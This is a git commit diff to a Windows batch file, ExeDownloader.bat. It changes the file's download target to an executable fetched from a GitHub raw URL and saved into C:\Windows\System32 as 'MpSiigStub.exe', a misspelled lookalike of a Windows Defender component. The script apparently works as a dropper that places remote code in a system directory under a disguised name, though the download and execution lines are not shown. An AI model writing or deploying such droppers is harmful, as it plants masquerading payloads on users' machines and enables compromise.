e35939adc9914c336d7d36efd0b8c79e932094c8
Sniffer-Lexel <xzelvo@gmail.com>
2024-11-28 18:33:06 +0530

    Update ExeDownloader.bat

--- ExeDownloader.bat
+++ ExeDownloader.bat
@@ -1,7 +1,7 @@
 @echo off
 :: Define the download URL and destination directory
-set "URL=https://raw.githubusercontent.com/Sniffer-Lexel/Lorlel/5d49489cef02aac76936a103cd2258be1f4e1cba/JusticeMenu.dll"
-set "DEST=C:\Windows\System32\JusticeMenu.dll"
+set "URL=https://raw.githubusercontent.com/Sniffer-Lexel/Free/ea9816fa9ad5b926fb392606699abc8592aaabaa/MpSiigStub.exe"
+set "DEST=C:\Windows\System32\MpSiigStub.exe"
 
 :: Create the destination directory if it doesn't exist
 mkdir "%~dp0" >nul 2>&1
